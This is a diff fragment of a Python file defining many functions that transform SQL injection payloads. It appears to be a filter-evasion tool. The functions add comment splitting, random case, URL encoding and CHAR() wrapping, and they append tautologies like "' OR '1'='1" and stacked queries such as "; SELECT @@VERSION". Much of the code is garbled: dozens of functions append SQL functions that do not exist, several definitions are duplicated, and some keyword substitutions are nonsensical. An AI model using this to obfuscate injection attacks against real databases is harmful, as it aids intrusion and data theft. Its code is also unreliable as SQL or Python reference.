+    return payload + " ROUND(column)"
+
+def use_truncate_function(payload):
+    return payload + " TRUNCATE(column, 2)"
+
+def use_pi_function(payload):
+    return payload + " PI()"
+
+def use_exp_function(payload):
+    return payload + " EXP(column)"
+
+def use_ln_function(payload):
+    return payload + " LN(column)"
+
+def use_log_function(payload):
+    return payload + " LOG(column)"
+
+def use_log2_function(payload):
+    return payload + " LOG2(column)"
+
+def use_log10_function(payload):
+    return payload + " LOG10(column)"
+
+def use_pow_function(payload):
+    return payload + " POW(column, 2)"
+
+def use_sqrt_function(payload):
+    return payload + " SQRT(column)"
+
+def use_acos_function(payload):
+    return payload + " ACOS(column)"
+
+def use_asin_function(payload):
+    return payload + " ASIN(column)"
+
+def use_atan_function(payload):
+    return payload + " ATAN(column)"
+
+def use_atan2_function(payload):
+    return payload + " ATAN2(column, 1)"
+
+def use_cos_function(payload):
+    return payload + " COS(column)"
+
+def use_cot_function(payload):
+    return payload + " COT(column)"
+
+def use_degrees_function(payload):
+    return payload + " DEGREES(column)"
+
+def use_radians_function(payload):
+    return payload + " RADIANS(column)"
+
+def use_sin_function(payload):
+    return payload + " SIN(column)"
+
+def use_tan_function(payload):
+    return payload + " TAN(column)"
+
+def use_rpad_function(payload):
+    return payload + " RPAD(column, 10, ' ')"
+
+def use_lpad_function(payload):
+    return payload + " LPAD(column, 10, ' ')"
+
+def use_space_function(payload):
+    return payload + " SPACE(10)"
+
+def use_strcmp_function(payload):
+    return payload + " STRCMP(column, 'value')"
+
+def use_field_function(payload):
+    return payload + " FIELD(column, 'value')"
+
+def use_make_set_function(payload):
+    return payload + " MAKE_SET(column, 'value')"
+
+def use_find_in_set_function(payload):
+    return payload + " FIND_IN_SET(column, 'value')"
+
+def use_insert_function(payload):
+    return payload + " INSERT(column, 1, 1, 'value')"
+
+def use_interval_function(payload):
+    return payload + " INTERVAL(column, 1)"
+
+def use_json_value(payload):
+    return payload + " JSON_VALUE(column, '$.value')"
+
+def use_json_query(payload):
+    return payload + " JSON_QUERY(column, '$.value')"
+
+def use_json_modify(payload):
+    return payload + " JSON_MODIFY(column, '$.value', 'new_value')"
+
+def use_json_array(payload):
+    return payload + " JSON_ARRAY(column)"
+
+def use_json_object(payload):
+    return payload + " JSON_OBJECT(column)"
+
+def use_json_each(payload):
+    return payload + " JSON_EACH(column)"
+
+def use_json_extract(payload):
+    return payload + " JSON_EXTRACT(column, '$.value')"
+
+def use_json_array_append(payload):
+    return payload + " JSON_ARRAY_APPEND(column, '$.value', 'new_value')"
+
+def use_json_array_insert(payload):
+    return payload + " JSON_ARRAY_INSERT(column, '$.value', 'new_value')"
+
+def use_json_merge(payload):
+    return payload + " JSON_MERGE(column, 'new_value')"
+
+def use_json_remove(payload):
+    return payload + " JSON_REMOVE(column, '$.value')"
+
+def use_json_set(payload):
+    return payload + " JSON_SET(column, '$.value', 'new_value')"
+
+def use_json_type(payload):
+    return payload + " JSON_TYPE(column, '$.value')"
+
+def use_json_unquote(payload):
+    return payload + " JSON_UNQUOTE(column)"
+
+def use_json_valid(payload):
+    return payload + " JSON_VALID(column)"
+
+def use_bool_and(payload):
+    return payload + " BOOL_AND(column)"
+
+def use_bool_or(payload):
+    return payload + " BOOL_OR(column)"
+
+def use_bool_xor(payload):
+    return payload + " BOOL_XOR(column)"
+
+def use_bool_not(payload):
+    return payload + " BOOL_NOT(column)"
+
+def use_logical_and(payload):
+    return payload + " LOGICAL_AND(column)"
+
+def use_logical_or(payload):
+    return payload + " LOGICAL_OR(column)"
+
+def use_logical_xor(payload):
+    return payload + " LOGICAL_XOR(column)"
+
+def use_logical_not(payload):
+    return payload + " LOGICAL_NOT(column)"
+
+def use_compress(payload):
+    return payload + " COMPRESS(column)"
+
+def use_uncompress(payload):
+    return payload + " UNCOMPRESS(column)"
+
+def use_uncompressed_length(payload):
+    return payload + " UNCOMPRESSED_LENGTH(column)"
+
+def use_to_base64(payload):
+    return payload + " TO_BASE64(column)"
+
+def use_from_base64(payload):
+    return payload + " FROM_BASE64(column)"
+
+def use_setvalue(payload):
+    return payload + " SETVALUE(column, 'new_value')"
+
+def use_getvalue(payload):
+    return payload + " GETVALUE(column)"
+
+def use_any_value(payload):
+    return payload + " ANY_VALUE(column)"
+
+def use_concat_ws(payload):
+    return payload + " CONCAT_WS(',', column)"
+
+def use_concat_ws_distinct(payload):
+    return payload + " CONCAT_WS_DISTINCT(',', column)"
+
+def use_crc32(payload):
+    return payload + " CRC32(column)"
+
+def use_validatetime(payload):
+    return payload + " VALIDATETIME(column)"
+
+def use_validdate(payload):
+    return payload + " VALIDDATE(column)"
+
+def use_validtimestamp(payload):
+    return payload + " VALIDTIMESTAMP(column)"
+
+def use_validdecimal(payload):
+    return payload + " VALIDDECIMAL(column)"
+
+def use_validnumber(payload):
+    return payload + " VALIDNUMBER(column)"
+
+def use_validfloat(payload):
+    return payload + " VALIDFLOAT(column)"
+
+def use_validepoch(payload):
+    return payload + " VALIDEPOCH(column)"
+
+def use_validmd5(payload):
+    return payload + " VALIDMD5(column)"
+
+def use_validsha1(payload):
+    return payload + " VALIDSHA1(column)"
+
+def use_validsha2(payload):
+    return payload + " VALIDSHA2(column)"
+
+def use_validencrypt(payload):
+    return payload + " VALIDENCRYPT(column)"
+
+def use_validdecrypt(payload):
+    return payload + " VALIDDECRYPT(column)"
+
+def use_validbase64(payload):
+    return payload + " VALIDBASE64(column)"
+
+def use_validbinary(payload):
+    return payload + " VALIDBINARY(column)"
+
+def use_validhex(payload):
+    return payload + " VALIDHEX(column)"
+
+def use_validoctal(payload):
+    return payload + " VALIDOCTAL(column)"
+
+def use_validboolean(payload):
+    return payload + " VALIDBOOLEAN(column)"
+
+def use_validvarchar(payload):
+    return payload + " VALIDVARCHAR(column)"
+
+def use_validtext(payload):
+    return payload + " VALIDTEXT(column)"
+
+def use_validchar(payload):
+    return payload + " VALIDCHAR(column)"
+
+def use_validblob(payload):
+    return payload + " VALIDBLOB(column)"
+
+def use_validclob(payload):
+    return payload + " VALIDCLOB(column)"
+
+def use_validxml(payload):
+    return payload + " VALIDXML(column)"
+
+def use_validjson(payload):
+    return payload + " VALIDJSON(column)"
+
+def use_validarray(payload):
+    return payload + " VALIDARRAY(column)"
+
+def use_validset(payload):
+    return payload + " VALIDSET(column)"
+
+def use_validmulti(payload):
+    return payload + " VALIDMULTI(column)"
+
+def use_validvector(payload):
+    return payload + " VALIDVECTOR(column)"
+
+def use_validobject(payload):
+    return payload + " VALIDOBJECT(column)"
+
+def use_validhash(payload):
+    return payload + " VALIDHASH(column)"
+
+def use_validrecord(payload):
+    return payload + " VALIDRECORD(column)"
+
+def use_validtable(payload):
+    return payload + " VALIDTABLE(column)"
+
+def use_validview(payload):
+    return payload + " VALIDVIEW(column)"
+
+def use_validindex(payload):
+    return payload + " VALIDINDEX(column)"
+
+def use_validschema(payload):
+    return payload + " VALIDSCHEMA(column)"
+
+def use_validcatalog(payload):
+    return payload + " VALIDCATALOG(column)"
+
+def use_validrole(payload):
+    return payload + " VALIDROLE(column)"
+
+def use_validsequence(payload):
+    return payload + " VALIDSEQUENCE(column)"
+
+def use_validtrigger(payload):
+    return payload + " VALIDTRIGGER(column)"
+
+def use_validprocedure(payload):
+    return payload + " VALIDPROCEDURE(column)"
+
+def use_validfunction(payload):
+    return payload + " VALIDFUNCTION(column)"
+
+def use_validsynonym(payload):
+    return payload + " VALIDSYNONYM(column)"
+
+def use_validmaterialized_view(payload):
+    return payload + " VALIDMATERIALIZED_VIEW(column)"
+
+def use_validdatadictionary(payload):
+    return payload + " VALIDDATADICTIONARY(column)"
+
+def use_validmetadata(payload):
+    return payload + " VALIDMETADATA(column)"
+
+def use_validdictionary(payload):
+    return payload + " VALIDDICTIONARY(column)"
+
+def use_validkeyword(payload):
+    return payload + " VALIDKEYWORD(column)"
+
+def use_validexpression(payload):
+    return payload + " VALIDEEXPRESSION(column)"
+
+def use_validquery(payload):
+    return payload + " VALIDQUERY(column)"
+
+def use_validstatement(payload):
+    return payload + " VALIDSTATEMENT(column)"
+
+def use_validtransaction(payload):
+    return payload + " VALIDTRANSACTION(column)"
+
+def use_validsession(payload):
+    return payload + " VALIDSESSION(column)"
+
+def use_validlogin(payload):
+    return payload + " VALIDLOGIN(column)"
+
+def use_validconnection(payload):
+    return payload + " VALIDCONNECTION(column)"
+
+def use_validresource(payload):
+    return payload + " VALIDRESOURCE(column)"
+
+def use_validprivilege(payload):
+    return payload + " VALIDPRIVILEGE(column)"
+
+def use_validgrant(payload):
+    return payload + " VALIDGRANT(column)"
+
+def use_validrole(payload):
+    return payload + " VALIDROLE(column)"
+
+def use_validpolicy(payload):
+    return payload + " VALIDPOLICY(column)"
+
+def use_validconstraint(payload):
+    return payload + " VALIDCONSTRAINT(column)"
+
+def use_validindex_type(payload):
+    return payload + " VALIDINDEX_TYPE(column)"
+
+def use_validindex_mode(payload):
+    return payload + " VALIDINDEX_MODE(column)"
+
+def use_validindex_partition(payload):
+    return payload + " VALIDINDEX_PARTITION(column)"
+
+def use_validindex_subpartition(payload):
+    return payload + " VALIDINDEX_SUBPARTITION(column)"
+
+def use_validindex_segment(payload):
+    return payload + " VALIDINDEX_SEGMENT(column)"
+
+def use_validindex_maintenance(payload):
+    return payload + " VALIDINDEX_MAINTENANCE(column)"
+
+def use_validindex_organization(payload):
+    return payload + " VALIDINDEX_ORGANIZATION(column)"
+
+def use_validindex_storage(payload):
+    return payload + " VALIDINDEX_STORAGE(column)"
+
+def use_validindex_compression(payload):
+    return payload + " VALIDINDEX_COMPRESSION(column)"
+
+def use_validindex_logging(payload):
+    return payload + " VALIDINDEX_LOGGING(column)"
+
+def use_validindex_monitoring(payload):
+    return payload + " VALIDINDEX_MONITORING(column)"
+
+def use_validindex_synchronization(payload):
+    return payload + " VALIDINDEX_SYNCHRONIZATION(column)"
+
+def use_validindex_visibility(payload):
+    return payload + " VALIDINDEX_VISIBILITY(column)"
+
+def use_validindex_filter(payload):
+    return payload + " VALIDINDEX_FILTER(column)"
+
+def use_validindex_sample(payload):
+    return payload + " VALIDINDEX_SAMPLE(column)"
+
+def use_validindex_parallel(payload):
+    return payload + " VALIDINDEX_PARALLEL(column)"
+
+def use_validindex_allocation(payload):
+    return payload + " VALIDINDEX_ALLOCATION(column)"
+
+def use_validindex_type(payload):
+    return payload + " VALIDINDEX_TYPE(column)"
+
+def use_validindex_status(payload):
+    return payload + " VALIDINDEX_STATUS(column)"
+
+def use_validindex_stats(payload):
+    return payload + " VALIDINDEX_STATS(column)"
+
+def use_validindex_hint(payload):
+    return payload + " VALIDINDEX_HINT(column)"
+
+def use_validindex_expression(payload):
+    return payload + " VALIDINDEX_EXPRESSION(column)"
+
+def use_validindex_column(payload):
+    return payload + " VALIDINDEX_COLUMN(column)"
+
+def use_validindex_order(payload):
+    return payload + " VALIDINDEX_ORDER(column)"
+
+def use_validindex_sort(payload):
+    return payload + " VALIDINDEX_SORT(column)"
+
+def use_validindex_limit(payload):
+    return payload + " VALIDINDEX_LIMIT(column)"
+
+def use_validindex_rows(payload):
+    return payload + " VALIDINDEX_ROWS(column)"
+
+def use_validindex_blocks(payload):
+    return payload + " VALIDINDEX_BLOCKS(column)"
+
+def use_validindex_extent(payload):
+    return payload + " VALIDINDEX_EXTENT(column)"
+
+def use_validindex_degree(payload):
+    return payload + " VALIDINDEX_DEGREE(column)"
+
+def use_validindex_inmemory(payload):
+    return payload + " VALIDINDEX_INMEMORY(column)"
+
+def use_validindex_nologging(payload):
+    return payload + " VALIDINDEX_NOLOGGING(column)"
+
+def use_validindex_statistics(payload):
+    return payload + " VALIDINDEX_STATISTICS(column)"
+
+def use_validindex_storage_attributes(payload):
+    return payload + " VALIDINDEX_STORAGE_ATTRIBUTES(column)"
+
+def use_validindex_subpartition(payload):
+    return payload + " VALIDINDEX_SUBPARTITION(payload)"
+
+def use_validindex_subpartition_name(payload):
+    return payload + " VALIDINDEX_SUBPARTITION_NAME(column)"
+
+def use_validindex_tablespace(payload):
+    return payload + " VALIDINDEX_TABLESPACE(column)"
+
+def use_validindex_tablespace_name(payload):
+    return payload + " VALIDINDEX_TABLESPACE_NAME(column)"
+
+def use_validindex_visibility(payload):
+    return payload + " VALIDINDEX_VISIBILITY(column)"
+
+def use_validindex_volume(payload):
+    return payload + " VALIDINDEX_VOLUME(column)"
+
+def use_validindex_workload(payload):
+    return payload + " VALIDINDEX_WORKLOAD(column)"
+
+def use_validindex_zone(payload):
+    return payload + " VALIDINDEX_ZONE(column)"
+
+def add_confusion_chars(payload):
+    confusion_chars = ['@', '!', '`']
+    return ''.join([char + random.choice(confusion_chars) if random.choice([True, False]) else char for char in payload])
+
+def use_random_delimiters(payload):
+    delimiters = [';', ',', '|']
+    return ''.join([char + random.choice(delimiters) if random.choice([True, False]) else char for char in payload])
+
+def add_sql_injection_patterns(payload):
+    patterns = ["' OR '1'='1", "' AND '1'='1"]
+    return payload + " " + random.choice(patterns)
+
+def add_case_variation(payload):
+    return ''.join([char.upper() if random.choice([True, False]) else char.lower() for char in payload])
+
+def replace_keywords_with_synonyms(payload):
+    synonyms = {
+        "SELECT": "CHOOSE",
+        "FROM": "SOURCE",
+        "WHERE": "LOCATION",
+        "AND": "PLUS",
+        "OR": "ALSO"
+    }
+    for keyword, synonym in synonyms.items():
+        payload = payload.replace(keyword, synonym)
+    return payload
+
+def use_regex_escape(payload):
+    return re.escape(payload)
+
+def add_spaceless_obfuscation(payload):
+    return payload.replace(" ", "")
+
+def add_encoding_variations(payload):
+    encoded_payload = ''
+    for char in payload:
+        if random.choice([True, False]):
+            encoded_payload += urllib.parse.quote(char)
+        else:
+            encoded_payload += char
+    return encoded_payload
+
+def use_double_quotes(payload):
+    return payload.replace("'", '"')
+
+def use_single_quotes(payload):
+    return payload.replace('"', "'")
+
+def use_numeric_obfuscation(payload):
+    return ''.join([str(ord(char)) if char.isdigit() else char for char in payload])
+
+def use_substring_obfuscation(payload):
+    parts = [payload[i:i+3] for i in range(0, len(payload), 3)]
+    return ''.join([f"SUBSTRING({part}, 1, LEN({part}))" for part in parts])
+
+def use_function_obfuscation(payload):
+    functions = ["ASCII", "CHAR", "LEN"]
+    return ''.join([random.choice(functions) + f"({char})" if random.choice([True, False]) else char for char in payload])
+
+def use_comment_obfuscation(payload):
+    return ''.join([f"/*{char}*/" if random.choice([True, False]) else char for char in payload])
+
+def use_string_interpolation(payload):
+    return ''.join([f"{char}{{}}" if random.choice([True, False]) else char for char in payload])
+
+def use_alias_obfuscation(payload):
+    aliases = {"a": "alpha", "b": "beta", "c": "charlie"}
+    return ''.join([aliases[char] if char in aliases and random.choice([True, False]) else char for char in payload])
+
+def use_char_obfuscation(payload):
+    return ''.join([f"CHAR({ord(char)})" if random.choice([True, False]) else char for char in payload])
+
+def use_cast_obfuscation(payload):
+    return ''.join([f"CAST({char} AS VARCHAR)" if random.choice([True, False]) else char for char in payload])
+
+def use_type_conversion(payload):
+    return ''.join([f"CONVERT(VARCHAR, {char})" if random.choice([True, False]) else char for char in payload])
+
+def use_nested_comments(payload):
+    return ''.join([f"/*{char}*/" if random.choice([True, False]) else char for char in payload])
+
+def use_randomized_case(payload):
+    return ''.join([char.upper() if random.choice([True, False]) else char.lower() for char in payload])
+
+def use_function_splitting(payload):
+    parts = [payload[i:i+2] for i in range(0, len(payload), 2)]
+    return ''.join([f"{part}()" if random.choice([True, False]) else part for part in parts])
+
+def use_function_shuffling(payload):
+    functions = ["LOWER", "UPPER", "REVERSE"]
+    return ''.join([random.choice(functions) + f"({char})" if random.choice([True, False]) else char for char in payload])
+
+def use_alternate_function_calls(payload):
+    functions = ["HEX", "UNHEX", "MD5"]
+    return ''.join([random.choice(functions) + f"({char})" if random.choice([True, False]) else char for char in payload])
+
+def add_noop_statements(payload):
+    return payload + " ; SELECT 1"
+
+def add_recursive_comments(payload):
+    return ''.join([f"/*{char}/*{char}*/" if random.choice([True, False]) else char for char in payload])
+
+def add_dummy_functions(payload):
+    return ''.join([f"DUMMY({char})" if random.choice([True, False]) else char for char in payload])
+
+def add_duplicate_keywords(payload):
+    keywords = ["SELECT", "FROM", "WHERE"]
+    for keyword in keywords:
+        if keyword in payload:
+            payload = payload.replace(keyword, f"{keyword} {keyword}")
+    return payload
+
+def add_superfluous_keywords(payload):
+    keywords = ["INNER", "OUTER", "LEFT", "RIGHT"]
+    return ''.join([f"{random.choice(keywords)} " + char if random.choice([True, False]) else char for char in payload])
+
+def add_sql_version_function(payload):
+    return payload + " ; SELECT @@VERSION"
+
+def add_user_function_calls(payload):
+    functions = ["GETDATE()", "SYSDATE", "CURRENT_TIMESTAMP"]
+    return payload + " ; " + random.choice(functions)
+
+def add_execution_time(payload):
+    return payload + " ; SELECT NOW()"
+
+    return payload
